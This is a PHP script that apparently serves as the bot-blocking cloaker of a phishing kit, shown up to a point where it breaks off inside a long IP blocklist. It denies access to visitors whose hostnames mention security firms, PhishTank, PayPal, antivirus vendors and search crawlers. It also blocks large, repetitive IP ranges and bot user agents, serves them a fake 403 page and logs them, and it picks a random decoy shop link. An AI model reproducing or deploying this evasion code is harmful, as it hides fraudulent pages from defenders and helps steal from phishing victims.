<?php
include('ab.php');
session_start();
/// TIME
date_default_timezone_set('GMT');
$TIME = date("d-m-Y H:i:s"); 
$setting = parse_ini_file('.config');
$random_id = sha1(md5(rand(0,1000000)));
$link = array("https://href.li/?https://www.danicathreesixty.com",
"https://href.li/?https://www.thegldshop.com",
"https://href.li/?https://704-shop.myshopify.com",
"https://href.li/?https://corgi-overload-store.myshopify.com",
"https://href.li/?https://www.cubowl.com",
"https://href.li/?https://woolman.io",
"https://href.li/?https://store.lilbub.com",
"https://href.li/?https://www.davdev9.com",
"https://href.li/?https://shop-demure.com",
"https://href.li/?https://www.elevenmadisonpark.store",
"https://href.li/?https://faktr-store.com",
"https://href.li/?https://www.wanderlust.store");
$random = rand(0, 11);
$link = $link[$random];
$domain = preg_replace('/www\./i', '', $_SERVER['SERVER_NAME']);
// BLOCKERGG
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array("above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit", "msnbot","p3pwgdsn","netcraft","trendmicro", "ebay", "paypal", "torservers", "messagelabs", "sucuri.net", "crawler","duckduck","feedfetcher","BitDefender","mcafee","antivirus","cloudflare","p3pwgdsn","avg","avira","avast","ovh.net","security","twitter","bitdefender","virustotal","phising","clamav","baidu","safebrowsing","eset","mailshell","azure","miniature","tlh.ro","aruba","dyn.plus.net","pagepeeker","SPRO-NET-207-70-0","SPRO-NET-209-19-128","vultr","colocrossing.com","geosr","drweb","dr.web","linode.com","opendns",'cymru.com','sl-reverse.com','surriel.com','hosting','orange-labs','speedtravel','metauri','apple.com','bruuk.sk','sysms.net','oracle','cisco','amuri.net',"versanet.de","hilfe-veripayed.com");

if($setting['block_hostname'] == "1") {
    foreach($blocked_words as $word) {
        if (substr_count($hostname, $word) > 0) {
            $ip = getenv("REMOTE_ADDR");
            $file = fopen("block_bot.txt","a");
            fwrite($file," BLOCKED BY HOSTNAME || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
            $click = fopen("result/total_bot.txt","a");
            fwrite($click,"$ip (Detect by HOSTNAME)"."\n");
            fclose($click);
            header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
        }  
    }
}

$bannedIP = array("66.249.91.*","66.249.91.203","^81.161.59.*", "^66.135.200.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*", "^91.103.66.*", "^208.91.115.*", "^199.30.228.*","^84.93.84.*");
if($setting['block_iprange'] == "1") {
    if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
                  $ip = getenv("REMOTE_ADDR");
                  $file = fopen("block_bot.txt","a");
                  fwrite($file," BLOCKED BY IP || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
                   $click = fopen("result/total_bot.txt","a");
                    fwrite($click,"$ip (Detect by IP Range)"."\n");
                    fclose($click);
                    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
                  
    } else {
         foreach($bannedIP as $ip) {
              if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
                  $ip = getenv("REMOTE_ADDR");
                  $file = fopen("block_bot.txt","a");
                  fwrite($file," BLOCKED BY IP || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
                  $click = fopen("result/total_bot.txt","a");
                    fwrite($click,"$ip (Detect by IP Range)"."\n");
                    fclose($click);
                    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
                  
              }
         }
    }
}
$v_agent = $_SERVER['HTTP_USER_AGENT'];
$v_agent = $_SERVER['HTTP_USER_AGENT'];
if($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)" || $v_agent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)") {
        $ip = getenv("REMOTE_ADDR");
        $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED BY APPLEBOT || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
         $click = fopen("result/total_bot.txt","a");
        fwrite($click,"$ip (Detect by APPLEBOT)"."\n");
        fclose($click);
        header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}
if ($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {
        $ip = getenv("REMOTE_ADDR");
        $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED BY APPLEBOT || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
         $click = fopen("result/total_bot.txt","a");
        fwrite($click,"$ip (Detect by APPLEBOT)"."\n");
        fclose($click);
        header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}
if(strpos($_SERVER['HTTP_USER_AGENT'], 'favicon') or strpos($_SERVER['HTTP_USER_AGENT'], 'Java') or strpos($_SERVER['HTTP_USER_AGENT'], 'FreeBSD') or strpos($_SERVER['HTTP_USER_AGENT'], 'msnbot') or strpos($_SERVER['HTTP_USER_AGENT'], 'Yahoo! Slurp') or strpos($_SERVER['HTTP_USER_AGENT'], 'YahooSeeker') or strpos($_SERVER['HTTP_USER_AGENT'], 'Googlebot') or strpos($_SERVER['HTTP_USER_AGENT'], 'bingbot') or strpos($_SERVER['HTTP_USER_AGENT'], 'crawler') or strpos($_SERVER['HTTP_USER_AGENT'], 'PycURL') or strpos($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit') !== false) { 
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            
}
$id = $_SERVER['REMOTE_ADDR'];
$ips = array(
"^94.26.*.*", "^95.85.*.*", "^72.52.96.*", "^212.8.79.*", "^62.99.77.*", "^83.31.118.*", "^91.231.*.*", "^206.207.*.*", "^91.231.212.*", "^62.99.77.*", "^198.41.243.*", "^162.158.*.*", "^162.158.7.*", "^162.158.72.*", "^173.245.55.*", "^108.162.246.*", "^162.158.95.*", "^108.162.215.*", "^95.108.194.*", "^141.101.104.*", "^93.54.82.*", "^69.164.145.*", "^194.153.113.*", "^178.43.117.*", "^62.141.65.*", "^83.31.69.*", "^107.178.195.*", "^149.20.54.*", "^85.9.7.*", "^87.106.251.*", "^107.178.194.*", "^124.66.185.*", "^133.11.204.*", "^185.2.138.*", "^188.165.83.*", "^78.148.13.*", "^192.232.213.*", "^1.234.41.*", "^124.66.185.*", "^87.106.251.*", "^176.195.231.*", "^206.253.226.*", "^107.20.181.*", "^188.244.39.*", "^124.66.185.*", "^38.74.138.*", "^124.66.185.*", "^38.74.138.*", "^206.253.226.*", "^1.234.41.*", "^124.66.185.*", "^87.106.251.*", "^85.9.7.*", "^37.140.188.*", "^195.128.227.*", "^38.74.138.*", "^107.20.181.*", "^46.4.120.*", "^107.178.194.*", "^198.60.236.*", "^217.74.103.*", "^92.103.69.*", "^217.74.103.*", "^66.211.160.86*", "^46.244.*.*", "^131.120.12.*", "^157.201.10.*", "^172.217.*.*", "^103.86.99.*", "^213.100.*.*", "^216.58.*.*", "^173.194.*.*", "^74.125.133.*","^66.102.*.*", "^66.249.*.*", "^209.85.*.*", "^216.239.*.*", "^64.4.*.*", "^65.52.*.*", "^131.253.*.*", "^157.54.*.*", "^207.46.*.*", "^207.68.*.*", "^8.12.*.*", "^66.196.*.*", "^66.228.*.*", "^67.195.*.*", "^68.142.*.*", "^72.30.*.*", "^74.6.*.*", "^98.136.*.*", "^202.160.*.*", "^209.191.*.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*","^184.165.*.*","^198.68.61.*","^199.3.10.*","^204.119.24.*","^204.251.90.*","^100.43.*.*","^72.94.249.*","^103.6.76.*","^106.12.*.*","^115.231.36.*","^5.189.*.*","^66.102.6.*","^66.249.*.*","^173.252.*.*","^196.23.168.*","^190.82.81.*","^92.189.25.*","^52.31.147.*","^69.164.111.*","^173.252.86.*","^173.239.*.*","^203.215.181.*","^208.43.225.*","^173.192.*.*","^212.113.37.*","^119.63.*.*","^188.207.200.*","^89.108.102.*","^173.11.97.*","^209.185.108.*",
    "^209.185.253.*","^216.239.*.*","^64.68.*.*","^66.249.*.*","^72.14.199.*","^8.6.48.*","^141.185.209.*","^169.207.238.*","^202.160.*.*","^195.211.*.*","^185.41.162.*","^51.15.*.*","^84.51.153.*","^185.220.101.*","^40.85.158.*","^72.94.249.*","^8.23.224.*","^104.132.20.*","^1.33.126.*","^217.96.*.*","^64.233.160.*","^93.119.*.*","^23.27.152.*","^111.231.*.*","^144.217.82.*","^148.163.128.*","^41.208.72.*","^36.74.236.*","^64.233.173.*","^36.83.56.*","^87.115.213.*","^110.88.*.*","^46.101.119.*","^87.115.213.*","^68.14.83.*","^100.6.107.*","^174.255.*.*","^72.49.133.*","^104.15.60.*","^35.153.86.*","^191.98.136.*","^175.135.172.*","^134.119.*.*","^208.101.*.*","^104.42.*.*","^181.229.*.*","^89.234.*.*","^186.6.*.*","^103.19.16.*","^158.69.216.*","^157.39.109.*","^83.31.*.*","^92.23.56.*","^86.132.235.*","^106.133.165.*","^111.89.*.*","^14.101.178.*","^107.178.*.*","^180.29.89.*","^61.21.221.*","^204.85.191.*","^188.166.*.*","^103.19.16.*","^199.59.150.*","^209.135.212.*","^208.87.233.*","^83.31.*.*","^49.104.10.*","^216.252.*.*","^24.172.*.*","^193.128.*.*","^162.244.*.*","^40.121.198.*","^95.45.252.*","^188.166.*.*","^83.71.*.*","^66.214.*.*","^205.201.132.*","^40.107.*.*","^104.132.*.*","^173.205.33.*","^185.145.156.*","^17.198.249.*","^103.35.*.*","^128.28.*.*","^128.72.*.*","^128.75.*.*","^138.122.*.*","^139.59.*.*","^50.107.*.*","^66.102.*.*", "^38.100.*.*", "^107.170.*.*",
 "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*",
 "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*",
"^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*",
 "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*",
 "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*",
 "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*",
 "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*",
 "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*",
 "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*",
 "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*",
 "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*",
 "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*",
"^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*",
"^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*",
"^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*",
 "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*",
"^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*",
 "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*",
 "^66.211.169.3", "^66.211.169.66", "^89.163.159.214", "^37.128.131.171",
"^12.148.196.*", "^193.220.178.*", "^68.65.53.71", "^198.25.*.*", "^64.106.213.*",
"^104.108.64.175","104.83.233.198", "^173.194.116.102","^173.194.112.*",
"^65.55.206.154", "^193.221.113.53", "^208.76.45.53", "^208.84.*.*",
"^207.46.8.167", "^65.54.188.110", "^207.46.8.199", "^134.170.2.199", "^65.55.92.152",
"^65.54.188.94", "^65.55.37.104", "^65.55.92.168", "^65.55.37.120", "^65.55.33.119",
"^65.55.92.184", "^65.54.188.126","^65.55.37.88", "^65.55.37.88", "^65.55.92.136",
"^207.46.8.199", "^65.55.92.168", "^65.54.188.94", "^65.55.33.119", "^65.55.37.104",
"^65.54.188.110", "^65.55.37.72", "^65.55.92.152", "^207.46.8.167", "^65.55.33.135",
"^134.170.2.199", "^65.55.85.12", "^173.194.116.149", "^216.58.211.37" ,
"^89.163.159.214", "^64.233.*.*", "^66.102.*.*", "^66.249.*.*", "^216.239.*.*" , "^216.33.229.163" ,
"^64.233.173.*" , "^64.68.90.*",
"^66.102.*.*",
     "^38.100.*.*",
     "^107.170.*.*",
     "^149.20.*.*",
     "^38.105.*.*",
     "^74.125.*.*",
     "^66.150.14.*",
     "^54.176.*.*",
     "^38.100.*.*",
     "^184.173.*.*",
     "^66.249.*.*",
     "^128.242.*.*",
     "^72.14.192.*",
     "^208.65.144.*",
     "^74.125.*.*",
     "^209.85.128.*",
     "^216.239.32.*",
     "^74.125.*.*",
     "^207.126.144.*",
     "^173.194.*.*",
     "^64.233.160.*",
     "^72.14.192.*",
     "^66.102.*.*",
     "^64.18.*.*",
     "^194.52.68.*",
     "^194.72.238.*",
     "^62.116.207.*",
     "^212.50.193.*",
     "^69.65.*.*",
     "^50.7.*.*",
     "^131.212.*.*",
     "^46.116.*.* ",
     "^62.90.*.*",
     "^89.138.*.*",
     "^82.166.*.*",
     "^85.64.*.*",
     "^85.250.*.*",
     "^89.138.*.*",
     "^93.172.*.*",
     "^109.186.*.*",
     "^194.90.*.*",
     "^212.29.192.*",
     "^212.29.224.*",
     "^212.143.*.*",
     "^212.150.*.*",
     "^212.235.*.*",
     "^217.132.*.*",
     "^50.97.*.*",
     "^217.132.*.*",
     "^209.85.*.*",
     "^66.205.64.*",
     "^204.14.48.*",
     "^64.27.2.*",
     "^67.15.*.*",
     "^202.108.252.*",
     "^193.47.80.*",
     "^64.62.136.*",
     "^66.221.*.*",
     "^64.62.175.*",
     "^198.54.*.*",
     "^192.115.134.*",
     "^216.252.167.*",
     "^193.253.199.*",
     "^69.61.12.*",
     "^64.37.103.*",
     "^38.144.36.*",
     "^64.124.14.*",
     "^206.28.72.*",
     "^209.73.228.*",
     "^158.108.*.*",
     "^168.188.*.*",
     "^66.207.120.*",
     "^167.24.*.*",
     "^192.118.48.*",
     "^67.209.128.*",
     "^12.148.209.*",
     "^12.148.196.*",
     "^193.220.178.*",
     "68.65.53.71",
     "^198.25.*.*",
     "^64.106.213.*",
     "^54.228.218.117",
     "^54.228.218.*",
     "^185.28.20.243",
     "^185.28.20.*",
     "^217.16.26.166",
     "^217.16.26.*
     ^206.207.*.*", "^209.19.*.*", "^207.70.*.*", "^185.75.*.*", "^193.226.*.*", "^66.102.*.*", "^64.71.*.*", "^69.164.*.*", "^64.74.*.*", "^64.235.*.*", "^4.14.64.*.*", "^4.14.64.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^72.13.86.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*",  "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "^68.65.53.71", "^198.25.*.*", "^4.14.0.0",
     "^206.207.*.*",
 "^209.19.*.*",
 "^207.70.*.*",
 "^185.75.*.*",
 "^193.226.*.*",
 "^66.102.*.*",
 "^64.71.*.*",
 "^69.164.*.*",
 "^64.74.*.*",
 "^64.235.*.*",
 "^4.14.64.*.*",
 "^4.14.64.*",
 "^38.100.*.*",
 "^107.170.*.*",
 "^149.20.*.*",
 "^38.105.*.*",
 "^74.125.*.*",
  "^66.150.14.*",
 "^54.176.*.*",
 "^38.100.*.*",
 "^184.173.*.*",
 "^66.249.*.*",
 "^128.242.*.*",
 "^72.14.192.*",
 "^72.13.86.*",
 "^208.65.144.*",
 "^74.125.*.*",
 "^209.85.128.*",
 "^216.239.32.*",
 "^74.125.*.*",
 "^207.126.144.*",
 "^173.194.*.*",
 "^64.233.160.*",
 "^72.14.192.*",
 "^66.102.*.*",
 "^64.18.*.*",
 "^194.52.68.*",
 "^194.72.238.*",
 "^62.116.207.*",
 "^212.50.193.*",
 "^69.65.*.*",
 "^131.212.*.*",
 "^46.116.*.* ",
 "^62.90.*.*",
 "^89.138.*.*",
 "^82.166.*.*",
 "^85.64.*.*",
 "^85.250.*.*",
 "^89.138.*.*",
 "^93.172.*.*",
 "^109.186.*.*",
 "^194.90.*.*",
 "^212.29.192.*",
 "^212.29.224.*",
 "^212.143.*.*",
 "^212.150.*.*",
 "^212.235.*.*",
 "^217.132.*.*",
 "^50.97.*.*",
 "^217.132.*.*",
 "^209.85.*.*",
 "^66.205.64.*",
 "^204.14.48.*",
  "^64.27.2.*",
 "^67.15.*.*",
 "^202.108.252.*",
 "^193.47.80.*",
 "^64.62.136.*",
 "^66.221.*.*",
 "^64.62.175.*",
 "^198.54.*.*",
 "^192.115.134.*",
 "^216.252.167.*",
 "^193.253.199.*",
 "^69.61.12.*",
 "^64.37.103.*",
 "^38.144.36.*",
 "^64.124.14.*",
 "^206.28.72.*",
 "^209.73.228.*",
 "^158.108.*.*",
 "^168.188.*.*",
 "^66.207.120.*",
 "^167.24.*.*",
 "^192.118.48.*",
 "^67.209.128.*",
 "^12.148.209.*",
 "^12.148.196.*",
 "^193.220.178.*",
 "^68.65.53.71",
 "^198.25.*.*",
 "^4.14.0.0",
     '^104.236.153.*',
    '^107.170.*.*',
    '^64.71.206.*',
    '^64.71.205.*',
    '^64.71.204.*',
    '^66.102.8.*',
    '^157.55.39.*',
    '^105.107.79.*',
    '^4.14.64.*',
    '^64.74.215.*',
    '^198.186.190.*',
    '^198.186.191.*',
    '^198.186.192.*',
    '^198.186.193.*',
    '^109.186.*.*',
    '^12.148.196.*',
    '^12.148.209.*',
    '^128.242.*.*',
    '^131.212.*.*',
    '^149.20.*.*',
    '^158.108.*.*',
    '^163.195.178.*',
    '^167.24.*.*',
    '^168.188.*.*',
    '^173.194.*.*',
    '^173.224.160.*',
    '^173.224.161.*',
    '^173.224.162.*',
    '^173.224.163.*',
    '^173.224.164.*',
    '^173.224.165.*',
    '^173.224.166.*',
    '^173.224.167.*',
    '^184.173.*.*',
    '^192.115.134.*',
    '^192.118.48.*',
    '^193.220.178.*',
    '^193.253.199.*',
    '^193.47.80.*',
    '^194.52.68.*',
    '^194.72.238.*',
    '^194.90.*.*',
    '^198.25.*.*',
    '^198.54.*.*',
    '^199.30.228.*',
    '^202.108.252.*',
    '^204.14.48.*',
    '^206.28.72.*',
    '^207.126.144.*',
    '^208.65.144.*',
    '^208.91.115.*',
    '^209.73.228.*',
    '^209.85.*.*',
    '^209.85.128.*',
    '^212.143.*.*',
    '^212.150.*.*',
    '^212.235.*.*',
    '^212.29.192.*',
    '^212.29.224.*',
    '^212.50.193.*',
    '^216.10.193.*',
    '^216.239.32.*',
    '^216.252.167.*',
    '^217.132.*.*',
    '^217.132.*.*',
    '^38.100.*.*',
    '^38.100.*.*',
    '^38.105.*.*',
    '^38.144.36.*',
    '^46.116.*.* ',
    '^50.7.*.*',
    '^50.97.*.*',
    '^54.176.*.*',
    '^62.116.207.*',
    '^62.90.*.*',
    '^64.106.213.*',
    '^64.124.14.*',
    '^64.18.*.*',
    '^64.233.160.*',
    '^64.27.2.*',
    '^64.37.103.*',
    '^64.62.136.*',
    '^64.62.175.*',
    '^66.102.*.*',
    '^66.102.*.*',
    '^66.135.200.*',
    '^66.150.14.*',
    '^66.205.64.*',
    '^66.207.120.*',
    '^66.221.*.*',
    '^66.249.*.*',
    '^67.15.*.*',
    '^67.209.128.*',
    '^68.65.53.71',
    '^69.61.12.*',
    '^69.65.*.*',
    '^72.14.192.*',
    '^72.14.192.*',
    '^74.125.*.*',
    '^74.125.*.*',
    '^74.125.*.*',
    '^81.161.59.*',
    '^82.166.*.*',
    '^85.250.*.*',
    '^85.64.*.*',
    '^89.138.*.*',
    '^89.138.*.*',
    '^91.103.66.*',
    '^93.172.*.*',
    "^81.161.59.*", 
"^66.135.200.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*", "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*", "^91.103.66.*", "^208.91.115.*", "^199.30.228.*","^66.102.*.*","^104.236.153.*","^65.55.85.12","^66.211.169.3", "^66.211.169.66", "^89.163.159.214", "^37.128.131.171",
"^12.148.196.*", "^193.220.178.*", "^68.65.53.71", "^198.25.*.*", "^64.106.213.*",
"^104.108.64.175","104.83.233.198", "^173.194.116.102","^173.194.112.*",
"^65.55.206.154", "^193.221.113.53", "^208.76.45.53", "^208.84.*.*",
"^207.46.8.167", "^65.54.188.110", "^207.46.8.199", "^134.170.2.199", "^65.55.92.152",
"^65.54.188.94", "^65.55.37.104", "^65.55.92.168", "^65.55.37.120", "^65.55.33.119",
"^65.55.92.184", "^65.54.188.126","^65.55.37.88", "^65.55.37.88", "^65.55.92.136",
"^207.46.8.199", "^65.55.92.168", "^65.54.188.94", "^65.55.33.119", "^65.55.37.104",
"^65.54.188.110","^1.128.96.181","^65.208.151.*","^1.132.97.75","^1.152.96.223",
"^38.100.*.*","^185.20.5.*","^185.20.4.*","^95.76.156.*","^216.58.211.37","^173.194.116.149",
"^107.170.*.*","^64.68.90.*","^64.233.173.*","^216.33.229.163","^216.239.*.*","^89.163.159.214",
"^149.20.*.*","^219.117.238.170","^79.79.148.223","^62.149.225.67","^104.131.165.123","^46.101.249.238","^79.79.147.162","^178.62.113.173","^1.152.97.32","^101.174.147.73","27.54.62.91","4.14.64.*",
"^38.105.*.*",
"^74.125.*.*",
"^66.150.14.*",
"^54.176.*.*",
"^38.100.*.*",
"^184.173.*.*",
"^66.249.*.*",
"^128.242.*.*",
"^72.14.192.*",
"^208.65.144.*",
"^74.125.*.*",
"^209.85.128.*",
"^216.239.32.*",
"^74.125.*.*",
"^207.126.144.*",
"^173.194.*.*",
"^64.233.160.*",
"^72.14.192.*",
"^66.102.*.*",
"^64.18.*.*",
"^194.52.68.*",
"^194.72.238.*",
"^62.116.207.*",
"^212.50.193.*",
"^69.65.*.*",
"^50.7.*.*",
"^131.212.*.*",
"^46.116.*.* ",
"^62.90.*.*",
"^89.138.*.*",
"^82.166.*.*",
"^85.64.*.*",
"^85.250.*.*",
"^89.138.*.*",
"^93.172.*.*",
"^109.186.*.*",
"^194.90.*.*",
"^212.29.192.*",
"^212.29.224.*",
"^212.143.*.*",
"^212.150.*.*",
"^212.235.*.*",
"^217.132.*.*",
"^50.97.*.*",
"^217.132.*.*",
"^209.85.*.*",
